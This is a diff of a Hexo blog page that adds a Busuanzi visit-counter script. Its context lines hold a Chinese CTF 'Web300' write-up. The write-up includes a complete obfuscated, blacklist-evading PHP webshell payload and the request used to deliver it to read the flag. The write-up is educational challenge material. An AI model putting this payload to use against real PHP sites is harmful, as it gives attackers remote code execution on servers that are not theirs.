@@ -184,7 +184,7 @@
 <h3 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h3><p>打开首页，对源代码进行分析，发现黑名单过滤了很多字符，参数传值不在黑名单会直接写入文件中，文件名随机生成，经过测试还有几个字符没有进行过滤，例如<code>$_()[]+’;</code> , 然后开始构造webshell。<br>由于+在传送中会被解释为空格，所以需要提前url编码为%2b<br>Payload:</p>
 <pre><code>$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); 
 </code></pre><p>通过content传参，成功后会得到一个shell的地址。<br><code>http://x.x.x.x/?content=payload</code><br>打开shell地址，post数据过去,查看源码读到flag。如下图：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/78992810.jpg" alt=""><br>参考链接：<a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="noopener">一道好玩的webshell题</a></p>
-<p><em>转载请保留原文链接及作者。</em></p>
+<p><em>转载请保留原文链接及作者。</em><span id="busuanzi_container_page_pv" style="color: #ddd;"><br>  本文总阅读量：<span id="busuanzi_value_page_pv"></span>次<br></span></p>
 
     </article>
     <!-- 前后页  -->
@@ -241,6 +241,11 @@
         <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
     </div>
     <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">Welcome, No. <span id="busuanzi_value_site_uv"></span> visitor.
+        </span>
+    </div>
     
 </footer>
     </div>
@@ -347,6 +352,8 @@ jsonContent:
     }
 </script>
     <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
     
     <!-- CNZZ统计  -->
     
